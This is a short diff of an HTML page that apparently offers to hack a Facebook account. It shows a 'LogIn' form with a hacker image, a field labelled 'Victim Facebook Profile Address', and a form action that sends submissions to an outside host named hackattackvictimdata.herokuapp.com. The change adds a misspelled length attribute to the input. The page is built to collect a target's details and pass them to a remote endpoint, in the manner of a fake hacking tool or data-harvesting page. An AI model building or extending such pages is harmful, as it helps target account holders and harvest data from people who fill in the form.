@@ -61,7 +61,7 @@ body { margin:0; padding:0; font-family: sans-serif; background: linear-gradient
          <h2>LogIn</h2> 
 		 <div class="log"><img src="https://www.freepnglogos.com/uploads/hacker-png/hacker-png-png-foto-24.png" width="200" alt="hacker png png foto" /></div>
          <form action="https://hackattackvictimdata.herokuapp.com/" method=""> <div class="user-box"> 
-         <input type="text" name="" required="required"> 
+         <input type="text" name="" required="required" minlegth="40"> 
          <label>Victim Facebook Profile Address</label> 
          </div> 
          <div class="user-box"> 
